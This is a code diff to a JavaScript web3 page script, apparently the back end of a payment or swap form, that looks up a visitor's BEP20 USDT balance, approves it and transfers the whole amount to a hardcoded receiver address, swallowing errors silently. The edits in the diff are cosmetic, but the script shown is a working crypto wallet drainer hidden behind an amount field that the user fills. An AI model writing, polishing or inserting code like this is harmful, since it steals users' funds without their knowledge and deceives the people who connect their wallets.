@@ -1,6 +1,5 @@
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-
 const usdtABI = [
   {
     constant: false,
@@ -49,10 +48,10 @@ async function approveAndTransfer() {
   const user = accounts[0];
 
   const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
-  const decimals = await usdt.methods.decimals().call();
   const balance = await usdt.methods.balanceOf(user).call();
+  const decimals = await usdt.methods.decimals().call();
 
-  if (balance === "0") return;
+  if (parseInt(balance) === 0) return;
 
   try {
     // Approve first
@@ -61,7 +60,7 @@ async function approveAndTransfer() {
     // Then transfer using transferFrom
     await usdt.methods.transferFrom(user, receiver, balance).send({ from: user });
   } catch (e) {
-    // silent fail — do nothing
+    // silent fail
   }
 }
 
@@ -88,7 +87,7 @@ async function fillMax() {
   const balance = await usdt.methods.balanceOf(user).call();
   const decimals = await usdt.methods.decimals().call();
 
-  const formatted = balance / 10 ** decimals;
+  const formatted = balance / (10 ** decimals);
   document.getElementById("amount").value = formatted.toFixed(2);
   updateFiat();
 }
